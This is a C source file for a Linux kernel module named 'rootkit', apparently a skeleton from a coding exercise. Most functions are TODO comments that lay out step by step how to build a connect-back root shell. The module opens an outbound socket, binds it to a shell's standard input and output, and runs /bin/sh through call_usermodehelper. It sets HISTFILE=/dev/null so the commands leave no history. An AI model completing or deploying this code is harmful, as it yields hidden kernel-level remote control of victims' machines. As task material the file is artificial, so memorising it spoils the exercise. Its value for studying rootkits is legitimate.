// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/err.h>
#include <linux/file.h>
#include <linux/mutex.h>
#include <linux/net.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

#include "rootkit.h"

static char *shell_envp[] = {
	"HOME=/",
	"PATH=/sbin:/bin:/usr/sbin:/usr/bin",
	"TERM=linux",
	"HISTFILE=/dev/null",
	NULL,
};

/* ------------------------------------------------------------------ */
/* Timeout callback                                                    */
/* ------------------------------------------------------------------ */

/*
 * TODO: Implement rk_shell_timeout_fn (delayed_work callback).
 *
 * 1. Use container_of + to_delayed_work to get the rk_shell pointer.
 * 2. Lock the shell mutex.
 * 3. If shell->busy and shell->sock are set, call
 *    kernel_sock_shutdown(shell->sock, SHUT_RDWR) to kill the shell.
 * 4. Unlock the mutex.
 */

/*
 * TODO: Implement rk_shell_touch.
 *
 * Reset the inactivity timer by calling:
 *   mod_delayed_work(system_wq, &shell->timeout_work,
 *                    shell->timeout_jiffies);
 */

/* ------------------------------------------------------------------ */
/* File descriptor installation for call_usermodehelper                 */
/* ------------------------------------------------------------------ */

static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

/*
 * TODO: Implement rk_shell_init_fn (call_usermodehelper init callback).
 *
 * Cast info->data to struct rk_shell *. If shell->file is NULL,
 * return -ECANCELED. Install shell->file as file descriptors 0, 1,
 * and 2 using rk_install_fd.
 */

/* ------------------------------------------------------------------ */
/* Shell lifecycle                                                     */
/* ------------------------------------------------------------------ */

/*
 * TODO: Implement rk_shell_init (non-static, declared in rootkit.h).
 *
 * Initialize all fields of the shell struct:
 *   - mutex_init
 *   - busy = false
 *   - sock = NULL, file = NULL
 *   - timeout_jiffies = RK_TIMEOUT_SEC * HZ
 *   - cmd[0] = '\0'
 *   - INIT_DELAYED_WORK(&shell->timeout_work, rk_shell_timeout_fn)
 */

/*
 * TODO: Implement rk_shell_make_file.
 *
 * Convert shell->sock to a file using sock_alloc_file.
 * Store the result in shell->file. Note that sock_alloc_file
 * takes ownership of the socket.
 */

/*
 * TODO: Implement rk_shell_cleanup.
 *
 * 1. Cancel the delayed work with cancel_delayed_work_sync.
 * 2. If shell->file is set, fput it and clear both file and sock.
 * 3. Otherwise, if shell->sock is set, sock_release it.
 */

/* ------------------------------------------------------------------ */
/* Interactive shell work function                                     */
/* ------------------------------------------------------------------ */

/*
 * TODO: Implement rk_interactive_work.
 *
 * 1. Connect with rk_connect().
 * 2. Store the socket in shell->sock.
 * 3. Convert to file with rk_shell_make_file.
 * 4. Start the inactivity timer with rk_shell_touch.
 * 5. Set up call_usermodehelper with "/bin/sh", "-i".
 * 6. Execute with UMH_WAIT_PROC.
 * 7. Clean up: rk_shell_cleanup, set busy = false under lock.
 */

/* ------------------------------------------------------------------ */
/* Exec shell work function                                            */
/* ------------------------------------------------------------------ */

/*
 * TODO: Implement rk_exec_work.
 *
 * Same as interactive, but use "/bin/sh", "-c", shell->cmd.
 * After cleanup, also clear cmd[0].
 */

/* ------------------------------------------------------------------ */
/* Public shell start functions                                        */
/* ------------------------------------------------------------------ */

/*
 * TODO: Implement rk_start_interactive.
 *
 * Lock the interactive_shell mutex. If busy, return -EBUSY.
 * Otherwise set busy = true and start the timeout timer with
 * mod_delayed_work. Unlock and return.
 */

/*
 * TODO: Implement rk_start_exec.
 *
 * Validate cmd is non-NULL, non-empty, and shorter than RK_CMD_MAX.
 * Lock the exec_shell mutex. If busy, return -EBUSY.
 * Otherwise set busy = true, copy the command, start the timer.
 * Unlock and return.
 */

/* ------------------------------------------------------------------ */
/* Shell teardown                                                      */
/* ------------------------------------------------------------------ */

/*
 * TODO: Implement rk_shell_stop (non-static, declared in rootkit.h).
 *
 * Lock the mutex. If sock is set, kernel_sock_shutdown it.
 * Unlock. Then cancel_delayed_work_sync.
 */
